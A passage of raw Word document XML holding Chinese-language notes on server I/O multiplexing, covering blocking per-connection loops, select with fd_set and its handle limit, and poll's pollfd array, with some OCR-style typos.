      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>实际上当时也有异步模式，如:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select/po：l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模型，这些技术都有一定的缺点，如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">selelct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">最大不能超过1024, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>poll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>没有限制，但毎次收到数据需要遍历每一个连接查看哪个连 接有数据请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="bookmark52"/>
      <w:bookmarkEnd w:id="46"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>解决方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>解决这一问题，主要思路有两个：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>—个是对于每个连接处理分配一个独立的进程/线程：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>另一个思路是用同一进程/线程来同时处理若干连接。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>每个进程/线程同时处理多个连接</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="bookmark53"/>
      <w:bookmarkEnd w:id="47"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>传统思路</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>最简单的方法是循环挨个处理各个连接，毎个连接对应一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>socket,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当所有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>都 有数据的时候，这种方法是可行的。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>但是当应用读职某个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的文件数据不</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ready</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的时候，整个应用会阻塞在这里等 待该文件句柄，即使别的文件句柄</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ready,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>也无法往下处理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>思路：直接循环处理多个连接。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>问题：任一文件句柄的不成功会阻塞住整个应用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="313" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="48" w:name="bookmark54"/>
      <w:bookmarkEnd w:id="48"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="313" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">要解决上面阻塞的问题，思路很简单，如果我在读职文件句柄之前，先查下它的状态, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ready </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>了就进行处理，不</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ready</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">就不进行处理，这不就解决了这个问题了嘛？ 于是有了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>方案。用一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>fd_set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>结构体来告诉内核同时监控多个文件句柄，当 其中有文件句柄的状态发生指定变化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>(例如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>某句柄由不可用变为可用)或超时，则调用 返回。之后应用可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>FD.ISSET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>来逐个查看是哪个文件句柄的状态发生了变化。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="313" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这样做，小规模的连接问题不大，但当蟻数很多(文件句柄个数很多)的时候，逐个 检查状态就很慢了。因此，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>往往存在管理的句柄上限</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(FILSETSIZE)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。同时， 在使用上</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>因为只有一个字段记录关注和发生事件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>每次调用之前要重新初始化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">fd_set </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>结构体。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int select(int nfds, fd_set *readfds, fd_set *wxitefds, fd_set *exceptfds, struct timeval *timeout);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>思路：有连接请求抵达了再检查处理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>问题：句柄上限+重复初始化+逐个排查防有文件句柄状态效率不高。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="bookmark55"/>
      <w:bookmarkEnd w:id="49"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>poll</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="322" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>poll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>主要解决</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的前两个问题：通过一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pollfd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数组向内核传递需要关注的 事件消除文件句柄丄限，同时使用不同字段分别标注关注事件和发生事件，未避免重复 初始化。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
